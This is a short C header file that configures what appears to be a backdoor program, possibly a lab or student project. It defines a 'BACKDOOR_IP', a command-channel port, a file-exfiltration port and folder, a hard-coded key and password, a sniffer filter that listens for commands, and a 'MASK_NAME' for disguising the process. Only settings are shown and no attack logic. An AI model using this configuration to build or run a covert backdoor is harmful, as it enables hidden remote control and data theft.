#ifndef CONFIG_H
#define CONFIG_H

#define STR_HELPER(x) #x
#define STR(x) STR_HELPER(x)

#define NIC_NAME "ens33"
#define BACKDOOR_IP "192.168.0.121"
#define CMD_CHANNEL_PORT 383
#define FILE_EXFILT_PORT 8080
#define EXFILT_FOLDER_PATH "./"
#define HEADER_KEY "noob"
#define PASSWORD "password"

#define SNIFFER_FILTER "src host " BACKDOOR_IP " and dst port " STR(CMD_CHANNEL_PORT)

#define MASK_NAME "hello"

#endif
